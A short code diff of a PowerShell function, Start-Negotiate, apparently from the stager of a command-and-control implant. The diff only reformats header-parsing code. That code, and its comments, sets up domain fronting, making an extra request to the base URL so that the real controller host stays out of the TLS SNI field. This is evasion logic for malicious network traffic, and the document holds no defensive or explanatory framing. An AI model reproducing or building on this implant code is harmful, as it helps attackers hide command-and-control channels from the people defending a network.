@@ -111,14 +111,17 @@ function Start-Negotiate {
     if ($customHeaders -ne "") {
         $headers = $customHeaders -split ',';
         $headers | ForEach-Object {
-            $headerKey = $_.split(':')[0];
-            $headerValue = $_.split(':')[1];
-	    #If host header defined, assume domain fronting is in use and add a call to the base URL first
-	    #this is a trick to keep the true host name from showing in the TLS SNI portion of the client hello
-	    if ($headerKey -eq "host"){
-                try{$ig=$WC.DownloadData($s)}catch{}};
+            $headerKey = $($_ -split ':')[0];
+            $headerValue = $($_ -split ':')[1];
+            #If host header defined, assume domain fronting is in use and add a call to the base URL first
+            #this is a trick to keep the true host name from showing in the TLS SNI portion of the client hello
+            if ($headerKey -eq "host"){
+                try{$ig=$WC.DownloadData($s)}catch{};
+            }
+
             $wc.Headers.Add($headerKey, $headerValue);
         }
+        
     }
     $wc.Headers.Add("User-Agent",$UA);
     
@@ -214,10 +217,12 @@ function Start-Negotiate {
         $headers | ForEach-Object {
             $headerKey = $_.split(':')[0];
             $headerValue = $_.split(':')[1];
-	    #If host header defined, assume domain fronting is in use and add a call to the base URL first
-	    #this is a trick to keep the true host name from showing in the TLS SNI portion of the client hello
-	    if ($headerKey -eq "host"){
-                try{$ig=$WC.DownloadData($s)}catch{}};
+            #If host header defined, assume domain fronting is in use and add a call to the base URL first
+            #this is a trick to keep the true host name from showing in the TLS SNI portion of the client hello
+            if ($headerKey -eq "host"){
+                try{$ig=$WC.DownloadData($s)}catch{};
+            }
+
             $wc.Headers.Add($headerKey, $headerValue);
         }
     }
